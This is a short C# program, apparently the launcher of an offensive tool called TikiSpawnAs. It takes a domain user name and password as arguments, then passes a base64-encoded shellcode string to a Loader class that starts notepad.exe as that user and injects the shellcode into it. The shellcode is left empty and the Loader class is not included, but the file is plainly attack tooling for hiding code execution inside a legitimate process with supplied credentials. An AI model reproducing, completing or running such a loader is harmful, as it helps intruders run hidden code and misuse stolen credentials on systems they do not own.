using System;

namespace TikiSpawnAs
{
    class Program
    {
        static void Main(string[] args)
        {
            string targetProcess = @"C:\\Windows\\System32\\notepad.exe";
            string encodedShellcode = @"";

            string username = args[0];
            string password = args[1];

            string[] split = username.Split('\\');

            string domain = split[0];
            string user = split[1];

            var ldr = new Loader();

            try
            {
                ldr.LoadAs(targetProcess, Convert.FromBase64String(encodedShellcode), domain, user, password);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
